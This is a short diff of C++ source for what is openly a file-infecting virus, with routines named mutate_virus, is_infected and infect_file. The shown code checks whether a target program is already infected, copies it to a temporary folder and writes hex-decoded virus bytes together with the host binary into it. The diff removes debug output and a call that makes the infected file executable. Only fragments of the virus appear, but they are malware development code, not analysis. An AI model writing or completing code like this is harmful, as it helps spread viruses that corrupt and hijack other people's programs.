@@ -32,8 +32,6 @@ int main(int argc, char** argv) {
     std::string temporaryLocation = "garbage";
     std::string folder = "./tem/";
     create_directory(folder);
-    //std::string hex = mutate_virus();
-    //cout << hex << endl;
     if(argc > 1){
       fileName = argv[1];
       copy_uninfected_binary(hostName, folder);
@@ -45,7 +43,6 @@ int main(int argc, char** argv) {
         if(!is_infected(hostName, fileName)){
           make_temp_copy(hostName, fileName, folder, temporaryLocation);
           infect_file(hostName, fileName, folder, temporaryLocation);
-          modify_execute_access(fileName, true)
         }
         else{
           return 1;
@@ -141,7 +138,6 @@ void build_seed(std::string progName){
     std::istringstream(nextbyte) >> std::hex >> byte;
     seed << static_cast<uint8_t>(byte);
   }
-  cout << hex << endl;
   seed << host.rdbuf();
   seed.close();
   host.close();
@@ -206,7 +202,6 @@ void infect_file(std::string infectedHost, std::string fileName, std::string fol
       std::istringstream(nextbyte) >> std::hex >> byte;
       dst << static_cast<uint8_t>(byte);
     }
-    cout << hex << endl;
     hostSrc = temporaryLocation;
     hostSrc.insert(0, folder);
     std::ifstream src1(hostSrc, std::ios::binary);
